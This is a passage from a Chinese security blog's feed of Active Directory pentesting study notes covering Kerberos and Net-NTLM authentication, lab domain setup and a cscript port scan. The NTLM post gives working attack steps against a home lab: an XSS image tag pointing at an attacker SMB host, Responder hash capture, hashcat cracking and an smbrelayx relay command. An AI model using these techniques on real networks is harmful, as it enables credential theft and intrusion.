AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。
</code></pre>
<p>分析得贼仔细，太强了。</p>
<h3 id="总结">总结</h3>
<p>分析完Kerbroes认证流程后不难理解为什么NTLM协议的质询阶段很多师傅都是分析错的了,没动手抓包分析国，光看理论把Kerbroes和NTLM认证混淆了。</p>
<p>参考资料</p>
<p><a href="https://www.cnblogs.com/sup3rman/archive/2020/02/18/12329222.html">内网学习之Kerberos协议</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记三：攻击NTLM]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-3-Attack-NTLM/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-3-Attack-NTLM/">
        </link>
        <updated>2020-03-04T02:40:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
<p>最常见Pass The Hash 也就是Hash传递这一手法是就是利用Net-NTLM hash进行攻击的，仔细分析过Windows认证机制机制后会发现它就类似与一个web方面的重放攻击。</p>
<p>比如：</p>
<blockquote>
<p>在一些条件下通过中间人抓到了站点登录后台登录时的Web流量，但是登录密码被前端加密了（比如MD5），hash值无法解密，这时候我们只需要重放这个登陆包就可以完成后台登录认证。</p>
</blockquote>
<p>在Net-NTLM认证过程中Net-NTLM hash传递发生在质询第二个包：</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
<p>里面最关键的字段是用户名以及Response。缺一不可，所以原则上来说进行Hash传递的条件有两:</p>
<ul>
<li>
<p>抓到的Net-NTLM hash字段</p>
</li>
<li>
<p>hash对应的用户名。</p>
<p>个人不觉得能访问目标算条件，不能访问目标或者访问错误的目标想去搞Hash传递攻击本身就是个扯犊子的事情，就像Web重放一样，A站点的包你去重放给截然不同的B本身就很扯。关于协议版本对的上也是个人的总结，因为Net-NTLM协议在不同的版本上又可细分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法。v1和v2在windows认证机制的学习中以及提到过其不同的地方。</p>
</li>
</ul>
<h3 id="net-ntlm-hash窃取">Net-NTLM Hash窃取</h3>
<p>相关Hash会出现三个地方：</p>
<ul>
<li>
<p>SAM数据库</p>
</li>
<li>
<p>Lsass进程</p>
</li>
<li>
<p>传输过程</p>
<p>前两点已经做过总结：<a href="https://blog.gzsec.org/post/Dumping-Windows-Local-Credentials-Tools/">Windows本地hashdump备忘录</a>, 各类之所以能够读到明文时因为去dump了lsass中缓存的用户输入得到明文，如果明文缓存不存在的情况下（比如2012/10以后系统wdigest默认没开启，明文不存在），读到的其实可以理解为都是NTLM hash。值得注意的是：</p>
<ul>
<li>Net-NTLM hash和NTLM hash不是一回事。</li>
<li>Net-NTLM hash是Net-NTLM认证过程客户端第二次发送给服务端的包中的response字段。</li>
</ul>
</li>
</ul>
<p>了解完成就会明白Net-NTLM hash的窃取主要发生在传输环节，传输环节的攻击无非三个点。</p>
<p>第一是传输前就截取到数据包，类似与Hook app的发包接口获取明文<br>
第二是中间人攻击获取<br>
第三是在接收方获取。</p>
<p>第一个环节明显需要以及有对方能够控制底层流量权限，既然有了还搞啥Hash传递；第二个环节不少很了解，后续再学习；第三个环节需要接收方获取，通常情况下是控到刚好会被目标使用NILM认证访问的几率是很小的。不过可以伪造NTLM认证服务端，再配合其他漏洞进行利用。</p>
<p>比如XSS：</p>
<pre><code>&lt;img src=&quot;\\10.5.100.7\TheKingOfDuck.png&quot;&gt;
</code></pre>
<p>img标签是支持smb协议，然后smb协议本质上走的NTLM认证，NTLM认证在用户输入凭证前又会默认使用本地NTLM Hash先进行认证一遍，所以在无法Getshell的情况下，就可以伪造一个smb客户端，再通过该手法获取到Net-NTLM Hash，最后执行解密工作或hash传递攻击</p>
<p><strong>Responder伪造认证服务端</strong>：</p>
<p>伪造一个Net-NTLM协议认证服务端，当用户进行访问时系统默认会先将本地Net-NTLM hash进行验证，该hash可进行碰撞解密获取密码。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583305815079.png" alt="" loading="lazy"></figure>
<p>在目标机器上访问伪造的客户端(可以是多种形式，比如上面说到的xss获取)</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583305985478.png" alt="" loading="lazy"></figure>
<p>获得Net-NTLM hash：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583306002981.png" alt="" loading="lazy"></figure>
<p>同类工具还有<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>,原理都是一样的</p>
<h3 id="net-ntlm-hash-利用">Net-NTLM Hash 利用</h3>
<p><strong>Net-NTLMv1 Hash加密策略远弱于v2，拿到Net-NTLM v1 hash就约等于NTLM HASH，v2在暴力破解不成功的情况下就可以考虑Relay攻击</strong></p>
<h4 id="net-ntlm-v2-hash暴力破解">Net-NTLM v2 hash暴力破解</h4>
<p>将Responder获取到的Net-NTLM hash交给hashcat进行暴力破解</p>
<pre><code>hashcat -m 5600 attacker::ADSTUDY:1aef20d3cfba8772:9D01310D04E79AD84A789669BE40EF2C:0101000000000000D9C9E307FDF1D5014454D6B4C6B563920000000002000E0041004400530054005500440059000100060042004F0054000400160061006400730074007500640079002E0063006F006D0003001E0062006F0074002E0061006400730074007500640079002E0063006F006D000500160061006400730074007500640079002E0063006F006D0007000800D9C9E307FDF1D50106000400020000000800300030000000000000000000000000200000D6F78567C955B9EA05E044A994D2307E6DEF8486F2ECA33C9F042A0F501043C10A001000000000000000000000000000000000000900200063006900660073002F00310030002E0035002E003100300030002E0031003000000000000000000000000000 pass.txt --force
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583310530278.png" alt="" loading="lazy"></figure>
<p>如图是暴力破解成功的情况。</p>
<h4 id="net-ntlm-v2-hash-relay">Net-NTLM v2 hash Relay</h4>
<p>以relay2smb为例：</p>
<figure data-type="image" tabindex="6"><img src="https://camo.githubusercontent.com/ac10e8dc32ccc3ce85bc42d7b06472da2dfc0690/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303139303631333135333532383238332e706e673f782d6f73732d70726f636573733d696d6167652f77617465726d61726b2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33647a4d544d784d6a6b3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730" alt="" loading="lazy"></figure>
<p>利用条件有两：</p>
<ul>
<li>
<p>目标机器不能开启smb签名，否则利用无效,一般情况下,windows server会默认开启,而windows单机系统[win 7/8/8.1/10]默认都不会开。</p>
</li>
<li>
<p>对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用无效。</p>
<p><strong>值得一提的是域控默认开启smb签名的,其他默认没开</strong></p>
<p>relay对象10.5.100.7 (win7)<br>
攻击机10.5.100.10 （Kali）<br>
relay到 10.5.100.1 （2012）</p>
<p>在kali 使用nmap来检查签名是否开启，smbrelayx.py模块来发起relay攻击</p>
<pre><code>nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 10.5.100.7
</code></pre>
</li>
</ul>
<p><img src="https://thekingofduck.github.io/post-images/1583313947570.png" alt="" loading="lazy"><br>
（message_signing: disabled 即可，Responder自带的Runfinger也可以，不用检查也可以，Multirelay也会自动检查的）</p>
<p>在kali上开启relay</p>
<pre><code>python smbrelayx.py -h 192.168.22.162 -c whoami
</code></pre>
<p>在2012上执行</p>
<pre><code>dir \\10.5.100.10\C$
</code></pre>
<p>即可relay成功。</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583332013078.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583332020524.png" alt="" loading="lazy"></figure>
<h3 id="总结">总结</h3>
<p>大多数情况攻击NTLM能成功都是因为NTLM在认证是默认会先使用本地hash去登录目标服务，因此可以制造各种机会去获取到Net-NTLM hash再进一步解密操作。</p>
<ul>
<li>
<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
</li>
<li>
<p>Net-NTLM v2 hash需要暴力破解</p>
</li>
<li>
<p>NTLM-Relay 攻击的姿势很多，工具也多，msf/smbrelayx.py/Responder</p>
</li>
<li>
<p>触发让系统发送NTLM请求的地方非常多。因为很多地方都支持UNC路径</p>
</li>
</ul>
<p>比如：</p>
<ul>
<li>xss</li>
<li>各种图标（desktop.ini,scf文件，用户头像）</li>
<li>pdf/word</li>
<li>outlook</li>
<li>xxe/ssrf</li>
<li>etc...</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记二：Windows认证机制Net-NTLM刨析]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/">
        </link>
        <updated>2020-03-02T04:09:31.000Z</updated>
        <content type="html"><![CDATA[<p><strong>基础知识</strong></p>
<p>1.Windows本地认证：</p>
<p>认证的密码储存在SAM文件中，其位置为C:/Windows/system32/config/sam，词组security account manager,意思是安全账号管理器，其作用是对windows账户安全管理，类似于linux系统中的/etc/passwd文件,删除该文件即可删除账号密码。这也是PE破解系统密码的原理。</p>
<p>登录认证是会从该文件读取里面的加密后的密码(NTLM hash)和用户输入的密码进行对比。</p>
<p>NTLM hash生成流程如下：</p>
<ul>
<li>
<p>将明文口令转换成十六进制的格式</p>
</li>
<li>
<p>转换成Unicode格式，即在每个字节之后添加0x00</p>
</li>
<li>
<p>对Unicode字符串作MD4加密，生成32位的十六进制数字串</p>
<p>NTLM hash支持Net NTLM认证协议以及本地认证协议。其前身为LM Hash(LM算法脆弱，响应存在一些缺陷。主要出现在xp，03之下的系统)</p>
</li>
</ul>
<p>Net-NTLM认证流程：</p>
<ul>
<li>协商：主要用于确认双方协议版本</li>
<li>质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴。</li>
<li>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</li>
</ul>
<p>质询的完整过程：</p>
<ul>
<li>1.客户端向服务器端发送用户信息(用户名)请求</li>
<li>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。生成一 个Net-NTLM Hash存在内存中，同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li>
<li>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li>
</ul>
<p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。</p>
<p>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</p>
<p>注意:</p>
<p>1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同<br>
2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。<br>
3.SMB走的也是Net-NTLM协议。</p>
<p>以上属于Net-NTLM v2协议的详细流程<br>
Net-NTLMv1的加密流程如下：</p>
<ul>
<li>1.客户端向服务器发送一个请求</li>
<li>2.服务器接收到请求后，生成一个8位的Challenge，发送回客户端</li>
<li>3.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
<li>4.服务器校验response<br>
两者的流程可以说是相同的，但加密算法不同，后者Net-NTLMv1相对脆弱</li>
</ul>
<p><strong>质询抓包分析</strong></p>
<p>使用域户向域控共享目录发起请求，<br>
<img src="https://thekingofduck.github.io/post-images/1583247680147.png" alt="" loading="lazy"></p>
<p>在域用户机器上Wireshark抓包如下：</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583250718347.png" alt="" loading="lazy"></figure>
<p>步骤上质询有四步,可以将其看为一发一收两个来回</p>
<p>第一发：基础信息发送</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583250826048.png" alt="" loading="lazy"></figure>
<p>第一收：获取对方生成并发过来的Challenge</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583250919881.png" alt="" loading="lazy"></figure>
<p>第二发：将要登录到账户对应的NTLM Hash加密Challenge生成Response并发给服务器</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
<p>第二收：服务器校验response并返回结果</p>
<p><img src="https://thekingofduck.github.io/post-images/1583251428310.png" alt="" loading="lazy"><br>
（登录成功）<br>
<img src="https://thekingofduck.github.io/post-images/1583251781830.png" alt="" loading="lazy"><br>
（登录失败）</p>
<p>至此Net-NTLM协议通讯过程分析完成，也可以看到文章<a href="https://xz.aliyun.com/t/1943">NTLM hash和Net-NTLM hash介绍</a>0x03 Net-NTLM hash中的分析是错误的。</p>
<p>有个非常值得关注的点：</p>
<ul>
<li><strong>当用户进行涉及Net-NTLM认证的访问时系统默认会先将本地NTLM hash去走一遍Net-NTLM验证。</strong></li>
</ul>
<p>NTLM本地认证流程：</p>
<blockquote>
<p>winlogon.exe -&gt; 接收用户输入<br>
lsass.exe -&gt; 认证</p>
</blockquote>
<hr>
<p><strong>工作组认证和域环境认证的区别：</strong></p>
<p>工作组：点对点交易，无法相互信任。<br>
域环境：有信托机构(域)，相当于闲鱼卖东西需要闲鱼官方担保。</p>
<p>参考资料：</p>
<p><a href="https://www.bilibili.com/video/av65934941?from=search&amp;seid=9042861733006388518">彻底理解Windows认证</a><br>
<a href="https://xz.aliyun.com/t/1943">NTLM hash和Net-NTLM hash介绍</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记一：域环境的搭建]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/">
        </link>
        <updated>2020-03-01T22:50:43.000Z</updated>
        <content type="html"><![CDATA[<p>域渗透从0开始重新学习的第一天。<br>
台式机上是win10系统，VM里之前已经安装了2008和2012，再添加一台win7，计划用2012当域控，2008跑服务，win7做主要靶跳板。</p>
<p>win7是刚刚装的比较干净的机器，2008上有360，2012上有卡巴。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583198313108.PNG" alt="" loading="lazy"></figure>
<p>在2012上配置网络：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583198433041.PNG" alt="" loading="lazy"></figure>
<p>本地抗不住同时开太多的机器，DNS服务器放到域控上，所以dns解析指向本机，其他机器的DNS也是指向这个IP。</p>
<p>使用10.5.100.0/24这个段是因为学校内网用的这个段，日习惯了。。。</p>
<p>修改计算机名：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583198849620.PNG" alt="" loading="lazy"></figure>
<p>计算机名不能为存数字,修改为重启一下。</p>
<p>在服务器管理的“添加角色与功能”菜单中中添加AD域名服务和DNS服务器两项功能。</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583199291763.PNG" alt="" loading="lazy"></figure>
<p>选完一路点击下一步即可。</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583199504208.PNG" alt="" loading="lazy"></figure>
<p>安装完关闭再点服务器管理就有下图：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1583199627145.PNG" alt="" loading="lazy"></figure>
<p>多了刚刚添加的两项功能。</p>
<p>升级为2012为域控：</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583202560692.png" alt="" loading="lazy"></figure>
<p>设置域：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583202843342.png" alt="" loading="lazy"></figure>
<p>设置目录还原密码：</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1583202864621.png" alt="" loading="lazy"></figure>
<p>一路下一步然后确认安装即可，中图会有感叹号提示无法创建该DNS服务器委派, 无关痛痒。</p>
<p>安装完自动重启：</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1583203539677.png" alt="" loading="lazy"></figure>
<p>已经需要域管理账号登录了；</p>
<p>在AD用户管理中添加域用户账号：</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1583204864915.png" alt="" loading="lazy"></figure>
<p>密码复杂度策略很狗，得设复杂点才行。</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/1583205325297.png" alt="" loading="lazy"></figure>
<p>将其他机器加入域：</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/1583206230232.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://thekingofduck.github.io/post-images/1583206236247.png" alt="" loading="lazy"></figure>
<p>其他机器加入都是一样的操作，至此域环境搭建完成。</p>
<p>踩坑经验：家庭版系统无法加入域。</p>
<p>参考文献：</p>
<ul>
<li><a href="https://www.cnblogs.com/jassa/p/10170386.html">AD域环境搭建</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_493cafbb0102wa5s.html">AD目录服务数据库还原模式密码</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用cscript进行内网端口扫描]]></title>
        <id>https://thekingofduck.github.io/post/scan-ports-by-cscript/</id>
        <link href="https://thekingofduck.github.io/post/scan-ports-by-cscript/">
        </link>
        <updated>2020-02-28T13:06:54.000Z</updated>
        <content type="html"><![CDATA[<p>Code:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582974509141.png" alt="" loading="lazy"></figure>
<p>保存为xxx.vbs&gt;</p>
<pre><code> cscript.exe this.vbs ip 80 or 80,123,445
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582974824988.png" alt="" loading="lazy"></figure>
<p>原生，动静小。</p>
<p>适合防御严格的内网扫描。</p>
]]></content>
    </entry>
</feed>